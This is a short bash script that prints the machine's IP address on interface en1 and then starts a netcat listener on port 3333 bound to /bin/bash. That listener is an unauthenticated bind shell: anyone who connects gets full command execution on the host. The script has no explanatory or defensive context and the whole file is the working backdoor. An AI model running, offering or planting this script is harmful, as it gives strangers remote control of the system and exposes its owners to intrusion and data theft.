#!/bin/bash
ifconfig en1 | grep 'inet ' | cut -d' ' -f2
nc -l -p 3333 -e /bin/bash
